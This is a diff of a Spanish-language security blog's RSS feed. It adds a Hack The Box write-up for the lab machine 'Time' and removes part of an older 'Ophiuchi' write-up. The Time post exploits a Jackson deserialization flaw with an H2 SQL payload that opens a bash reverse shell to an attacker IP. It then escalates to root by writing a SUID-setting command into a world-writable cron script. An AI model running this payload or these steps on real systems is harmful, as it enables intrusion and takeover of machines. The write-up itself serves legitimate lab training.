@@ -5,9 +5,337 @@
     <description>Articulos, Writeups, Htb, Programación y Noticias sobre Ciberseguridad</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Sun, 28 May 2023 06:00:09 +0000</pubDate>
-    <lastBuildDate>Sun, 28 May 2023 06:00:09 +0000</lastBuildDate>
+    <pubDate>Mon, 12 Jun 2023 23:50:31 +0000</pubDate>
+    <lastBuildDate>Mon, 12 Jun 2023 23:50:31 +0000</lastBuildDate>
     <generator>Jekyll v3.9.0</generator>
+    
+      <item>
+        <title>Maquina Time - htb writeup</title>
+        <description>&lt;p&gt;Hoy vamos a resolver la máquina &lt;code&gt;Time&lt;/code&gt; de la plataforma de &lt;code&gt;hackthebox&lt;/code&gt; correspondiente a una &lt;code&gt;linux&lt;/code&gt; dificultad media, la cual va a ser explotada utilizando la vulnerabilidad de &lt;code&gt;Jackson CVE-2019-12384&lt;/code&gt;, y aprovecharemos la vulnerabilidad &lt;code&gt;SSRF&lt;/code&gt; derivandola en una ejecucion remota de comandos &lt;code&gt;RCE&lt;/code&gt; que nos dara acceso al sistema, para que finalmente aprovechandonos de una tarea &lt;code&gt;Cron&lt;/code&gt; podamos obtener acceso como el usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Vamos a comenzar creando un directorio con el nombre de la maquina:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Time
+❯ ls
+ Time
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
+mkt () {
+	mkdir {nmap,content,exploits,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap   scripts
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeración &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.214
+PING 10.10.10.214 (10.10.10.214) 56(84) bytes of data.
+64 bytes from 10.10.10.214: icmp_seq=1 ttl=63 time=133 ms
+
+--- 10.10.10.214 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 133.374/133.374/133.374/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Vemos que la maquina nos responde, ahora procederemos a el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;
+
+&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Parámetro&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;allPorts&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.214 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-12 20:48 GMT
+Initiating SYN Stealth Scan at 20:48
+Scanning 10.10.10.214 [65535 ports]
+Discovered open port 80/tcp on 10.10.10.214
+Discovered open port 22/tcp on 10.10.10.214
+Completed SYN Stealth Scan at 20:49, 17.83s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.214
+Host is up, received user-set (0.15s latency).
+Scanned at 2023-06-12 20:48:51 GMT for 18s
+Not shown: 65476 closed tcp ports (reset), 57 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 17.97 seconds
+           Raw packets sent: 87623 (3.855MB) | Rcvd: 86271 (3.451MB)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Podemos ver que los puertos que se encuentran abiertos son el puerto &lt;code&gt;22 ssh&lt;/code&gt; y el &lt;code&gt;80 http&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,80 10.10.10.214 -oN targeted
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-12 20:49 GMT
+Nmap scan report for 10.10.10.214
+Host is up (0.21s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 0f:7d:97:82:5f:04:2b:e0:0a:56:32:5d:14:56:82:d4 (RSA)
+|   256 24:ea:53:49:d8:cb:9b:fc:d6:c4:26:ef:dd:34:c1:1e (ECDSA)
+|_  256 fe:25:34:e4:3e:df:9f:ed:62:2a:a4:93:52:cc:cd:27 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Online JSON parser
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 20.90 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Puerto&lt;/th&gt;
+      &lt;th&gt;Servicio&lt;/th&gt;
+      &lt;th&gt;Versión&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;22&lt;/td&gt;
+      &lt;td&gt;SSH&lt;/td&gt;
+      &lt;td&gt;OpenSSH 8.2p1 Ubuntu 4ubuntu0.1&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;80&lt;/td&gt;
+      &lt;td&gt;HTTP&lt;/td&gt;
+      &lt;td&gt;Apache httpd 2.4.41&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Seguidamente vamos a usar la herramienta &lt;code&gt;whatweb&lt;/code&gt; para ver por consola el gestor de contenido de la pagina web.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;❯ whatweb http://10.10.10.214
+http://10.10.10.214 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.214], JQuery[3.2.1], Script, Title[Online JSON parser]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;La herramienta nos reporta que se trata de un &lt;code&gt;JSON parser&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Vamos a abrir la web y vemos que la pagina efectivamente es un &lt;code&gt;JSON parser&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Time/time1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos una opcion de &lt;code&gt;Beautify&lt;/code&gt; que al pasarle datos en &lt;code&gt;JSON&lt;/code&gt; nos lo muestra de manera mas estetica.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Time/time2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Dentro de las opciones tambien podemos ver una de &lt;code&gt;Validate (Beta)&lt;/code&gt;,y si procesamos una comilla nos arroja un error referente a &lt;code&gt;jackson java&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Time/time4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Investigando un poco encontramos que existe una vulnerabilidad a una libreria &lt;code&gt;jackson&lt;/code&gt; que se usa para la deserealizacion &lt;code&gt;JSON&lt;/code&gt; y mediante ello podemos realizar ataques de &lt;code&gt;SSRF&lt;/code&gt; y derivarlo a una ejecucion remota de comandos.&lt;/p&gt;
+
+&lt;p&gt;Si deseas entender a mayor detalle la vulnerabilidad te dejo el siguiente articulo:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://blog.doyensec.com/2019/07/22/jackson-gadgets.html&quot;&gt;https://blog.doyensec.com/2019/07/22/jackson-gadgets.html&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Para explotar esta vulnerabilidad debemos crear un archivo &lt;code&gt;inject.sql&lt;/code&gt; con el siguiente contenido:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
+	String[] command = {&quot;bash&quot;, &quot;-c&quot;, cmd};
+	java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(&quot;\\A&quot;);
+	return s.hasNext() ? s.next() : &quot;&quot;;  }
+$$;
+CALL SHELLEXEC('bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.3/443 0&amp;gt;&amp;amp;1')
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;En la función &lt;code&gt;shellexec&lt;/code&gt;, introducimos el codigo que queremos que se ejecute cuando suceda la desearialización. En este caso introduciremos una instrucción en &lt;code&gt;bash&lt;/code&gt; que nos permita obtener una reverse shell.&lt;/p&gt;
+
+&lt;p&gt;Lo siguiente ejecutar lo siguiente instrucción en el &lt;code&gt;JSON PARSER&lt;/code&gt;, donde especificaremos nuestra ip, donde nos compartiremos el archivo &lt;code&gt;inject.sql&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Time/time5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora nos compartimos el archivo, usando python.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Seguidamente nos ponemos en escucha en el puerto especifico, en este caso el &lt;code&gt;443&lt;/code&gt; y enviamos la instrucción.&lt;/p&gt;
+
+&lt;p&gt;Recibimos la petición&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.214 - - [12/Jun/2023 23:13:26] &quot;GET /inject.sql HTTP/1.1&quot; 200 -
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;y obnenemos acceso como el usuario &lt;code&gt;pericles&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.214.
+Ncat: Connection from 10.10.10.214:38128.
+bash: cannot set terminal process group (857): Inappropriate ioctl for device
+bash: no job control in this shell
+pericles@time:/var/www/html$ whoami
+whoami
+pericles
+pericles@time:/var/www/html$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Como siempre vamos a configurar nuestra &lt;code&gt;tty&lt;/code&gt; full interactiva&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;pericles@time:/var/www/html$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+pericles@time:/var/www/html$ ^Z
+zsh: suspended  ncat -nlvp 443
+❯ stty raw -echo; fg
+[1]  + continued  ncat -nlvp 443
+                                reset xterm
+pericles@time:/var/www/html$ export TERM=xterm
+pericles@time:/var/www/html$ export SHELL=bash 
+pericles@time:/var/www/html$ stty rows 45 columns 184
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Nos dirigimos al directorio personal del usuario &lt;code&gt;pericles&lt;/code&gt; y visializamos la primera flag &lt;code&gt;user.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;pericles@time:/var/www/html$ cd /home
+pericles@time:/home$ ls
+pericles
+pericles@time:/home$ cd pericles/
+pericles@time:/home/pericles$ ls
+snap  user.txt
+pericles@time:/home/pericles$ cat user.txt 
+5598d4c823ca1aadd34004c1ed4cbfc8
+pericles@time:/home/pericles$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Para poder elevar privilegios primeramente a enumerar ver la lista de temporalizadores para ver información util sobre las tareas programadas en el sistema, utilzando el comando &lt;code&gt;systenctl list-timers&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;pericles@time:/home/pericles$ systemctl list-timers
+NEXT                        LEFT          LAST                        PASSED               UNIT                         ACTIVATES                     
+Mon 2023-06-12 23:21:41 UTC 3s left       Mon 2023-06-12 23:21:31 UTC 6s ago               timer_backup.timer           timer_backup.service          
+Mon 2023-06-12 23:39:00 UTC 17min left    Mon 2023-06-12 23:09:00 UTC 12min ago            phpsessionclean.timer        phpsessionclean.service       
+Tue 2023-06-13 00:00:00 UTC 38min left    Mon 2023-06-12 20:41:25 UTC 2h 40min ago         logrotate.timer              logrotate.service             
+Tue 2023-06-13 00:00:00 UTC 38min left    Mon 2023-06-12 20:41:25 UTC 2h 40min ago         man-db.timer                 man-db.service                
+Tue 2023-06-13 00:09:59 UTC 48min left    Tue 2021-02-09 14:42:14 UTC 2 years 4 months ago motd-news.timer              motd-news.service             
+Tue 2023-06-13 03:56:23 UTC 4h 34min left Thu 2020-10-22 18:44:20 UTC 2 years 7 months ago apt-daily.timer              apt-daily.service             
+Tue 2023-06-13 06:16:25 UTC 6h left       Mon 2023-06-12 21:40:37 UTC 1h 41min ago         apt-daily-upgrade.timer      apt-daily-upgrade.service     
+Tue 2023-06-13 14:30:45 UTC 15h left      Mon 2023-06-12 22:46:51 UTC 34min ago            fwupd-refresh.timer          fwupd-refresh.service         
+Tue 2023-06-13 20:56:20 UTC 21h left      Mon 2023-06-12 20:56:20 UTC 2h 25min ago         systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+Sun 2023-06-18 03:10:37 UTC 5 days left   Mon 2023-06-12 20:42:05 UTC 2h 39min ago         e2scrub_all.timer            e2scrub_all.service           
+Mon 2023-06-19 00:00:00 UTC 6 days left   Mon 2023-06-12 20:41:25 UTC 2h 40min ago         fstrim.timer                 fstrim.service                
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Obervamos que se esta ejecutando un &lt;code&gt;timer_backup&lt;/code&gt;, ahora para enumerar los procesos que se estan ejecutando en el sistema, vamos a crearnos un pequeño script en bash de nombre &lt;code&gt;procmon.sh&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;#!/bin/bash
+
+old_process=$(ps -eo user,command)
+
+while true; do
+  new_process=$(ps -eo user,command)
+  diff &amp;lt;(echo &quot;$old_process&quot;) &amp;lt;(echo &quot;$new_process&quot;) | grep &quot;[\&amp;gt;\&amp;lt;]&quot; | grep -vE &quot;procmon|command|kworker&quot; 
+  old_process=$new_process
+done
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Lo ejecutamos en la maquina victima y vemos que el usuario &lt;code&gt;root&lt;/code&gt; esta ejecutando el arhivo &lt;code&gt;timer_backup.sh&lt;/code&gt; a intervalos regulares de tiempo.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root     /bin/sh -e /usr/lib/php/sessionclean
+root     /bin/sh -e /usr/lib/php/sessionclean
+root     /lib/systemd/systemd-udevd
+root     /lib/systemd/systemd-udevd
+root     /lib/systemd/systemd-udevd
+root     /bin/bash /usr/bin/timer_backup.sh
+root     zip -r website.bak.zip /var/www/html
+root     /bin/bash /usr/bin/timer_backup.sh
+root     zip -r website.bak.zip /var/www/html
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Viendo las propiedades del archivo, vemos que somos propieatarios, por tanto tenemos permiso de escritura.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;pericles@time:/home/pericles$ ls -l /usr/bin/timer_backup.sh
+-rwxrw-rw- 1 pericles pericles 88 Jun 12 23:40 /usr/bin/timer_backup.sh
+pericles@time:/home/pericles$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Lo siguiente que haremos sera modificar el archivo, añadiendole una instruccion que nos otorgue el privilegio &lt;code&gt;suid&lt;/code&gt; a la &lt;code&gt;bash&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;pericles@time:/home/pericles$ cat /usr/bin/timer_backup.sh
+#!/bin/bash
+chmod  u+s /bin/bash
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ya que el usuario &lt;code&gt;root&lt;/code&gt; nos ejecutara el archivo despues de unos segundos verificamos si nos asigno el permiso correspondiente a la &lt;code&gt;bash&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;pericles@time:/home/pericles$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1183448 Feb 25  2020 /bin/bash
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Lo unico que nos queda por hacer seria ejecutar &lt;code&gt;bash -p&lt;/code&gt; y nos convertiriamos en el usuario &lt;code&gt;root&lt;/code&gt;, ahora vamos a su directorio personal y visualizamos la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;pericles@time:/home/pericles$ bash -p
+bash-5.0# whoami
+root
+bash-5.0# cd /root
+bash-5.0# cat root.txt
+a527d7fbd3e113aeb96d956af2900de8
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+        <pubDate>Mon, 12 Jun 2023 00:00:00 +0000</pubDate>
+        <link>http://localhost:4000/hackthebox/htb-writeup-Time</link>
+        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Time</guid>
+        
+        <category>Jackson CVE-2019-12384 Exploitation</category>
+        
+        <category>SSRF to RCE</category>
+        
+        <category>Abusing Cron Job</category>
+        
+        
+        <category>hackthebox</category>
+        
+      </item>
     
       <item>
         <title>Maquina Monitors - htb writeup</title>
@@ -9247,724 +9575,6 @@ Info: Establishing connection to remote endpoint
         <category>macroinspection</category>
         
         <category>Active Directory</category>
-        
-        
-        <category>hackthebox</category>
-        
-      </item>
-    
-      <item>
-        <title>Maquina Ophiuchi - htb writeup</title>
-        <description>&lt;p&gt;Hoy vamos a hacer una máquina &lt;code&gt;hackthebox&lt;/code&gt; de dificultad media, la cual va a ser explotada utilizando la vulnerabilidad de deserialización de &lt;code&gt;YAML&lt;/code&gt; para &lt;code&gt;SnakeYAML&lt;/code&gt; utilizada en aplicaciones java, y modificando un archivo &lt;code&gt;wasm&lt;/code&gt; para obtener privilegios de &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Vamos a comenzar creando un directorio con el nombre de la maquina:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Ophiuchi
-❯ ls
- Ophiuchi
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
-mkt () {
-	mkdir {nmap,content,exploits,scripts}
-}
-❯ mkt
-❯ ls
- content   exploits   nmap   scripts
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeración &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.227
-PING 10.10.10.227 (10.10.10.227) 56(84) bytes of data.
-64 bytes from 10.10.10.227: icmp_seq=1 ttl=63 time=124 ms
-
---- 10.10.10.227 ping statistics ---
-1 packets transmitted, 1 received, 0% packet loss, time 0ms
-rtt min/avg/max/mdev = 124.383/124.383/124.383/0.000 ms
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Vemos que la maquina nos responde ahora procederemos a el scaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;
-
-&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Parámetro&lt;/th&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;allPorts&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.227 -oG allPorts
-Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
-Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-24 21:16 GMT
-Initiating SYN Stealth Scan at 21:16
-Scanning 10.10.10.227 [65535 ports]
-Discovered open port 8080/tcp on 10.10.10.227
-Discovered open port 22/tcp on 10.10.10.227
-Completed SYN Stealth Scan at 21:17, 18.29s elapsed (65535 total ports)
-Nmap scan report for 10.10.10.227
-Host is up, received user-set (0.15s latency).
-Scanned at 2023-03-24 21:16:59 GMT for 18s
-Not shown: 65533 closed tcp ports (reset)
-PORT     STATE SERVICE    REASON
-22/tcp   open  ssh        syn-ack ttl 63
-8080/tcp open  http-proxy syn-ack ttl 63
-
-Read data files from: /usr/bin/../share/nmap
-Nmap done: 1 IP address (1 host up) scanned in 18.46 seconds
-           Raw packets sent: 90294 (3.973MB) | Rcvd: 90276 (3.611MB)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Podemos ver que los puertos que se encuentran abiertos son el puerto 22 ssh y el 8080 http.&lt;/p&gt;
-
-&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,8080 10.10.10.227 -oN targeted
-Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-24 21:21 GMT
-Nmap scan report for 10.10.10.227
-Host is up (0.27s latency).
-
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA)
-|   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)
-|_  256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)
-8080/tcp open  http    Apache Tomcat 9.0.38
-|_http-title: Parse YAML
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 26.57 seconds
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Puerto&lt;/th&gt;
-      &lt;th&gt;Servicio&lt;/th&gt;
-      &lt;th&gt;Versión&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;22&lt;/td&gt;
-      &lt;td&gt;SSH&lt;/td&gt;
-      &lt;td&gt;OpenSSH 8.2p1 Ubuntu 4ubuntu0.1&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;8080&lt;/td&gt;
-      &lt;td&gt;HTTP&lt;/td&gt;
-      &lt;td&gt;Apache Tomcat 9.0.38&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;h2 id=&quot;website---tcp-8080&quot;&gt;Website - TCP 8080&lt;/h2&gt;
-
-&lt;p&gt;Vamos a usar la herramienta &lt;code&gt;whatweb&lt;/code&gt; para ver por consola el gestor de contenido de la pagina web.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;❯ whatweb http://10.10.10.227:8080
